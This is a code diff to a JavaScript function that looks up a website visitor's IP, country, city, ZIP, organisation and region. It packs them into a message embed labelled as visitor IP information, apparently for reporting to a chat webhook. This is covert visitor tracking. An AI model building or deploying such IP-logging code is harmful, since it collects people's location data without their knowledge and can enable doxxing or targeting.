@@ -16,7 +16,7 @@ async function IP_Info(){
   }
   IP_Info().then((value)=> {
     let requiredInfo = [
-      "status","country", "city", "zip", "regionName"
+      "status","country", "ip", "city", "zip", "org", "region"
     ]
     let noData = false
 
@@ -45,7 +45,7 @@ async function IP_Info(){
               color: "12223968",
               description: "```IP information of the recent website visitor.```",
               fields: [{
-                name: "IP", value: `${value.query}`, inline: false
+                name: "IP", value: `${value.ip}`, inline: false
               },
               {
                 name: "Country", value: `${value.country}`, inline: false
@@ -57,7 +57,10 @@ async function IP_Info(){
                 name: "ZIP", value: `${value.zip}`, inline: false
               },
               {
-                name: "Region", value: `${value.regionName}`, inline: false
+                name: "Org", value: `${value.org}`, inline: false
+              },
+              {
+                name: "Region", value: `${value.region}`, inline: false
               }
               ],
               footer: {
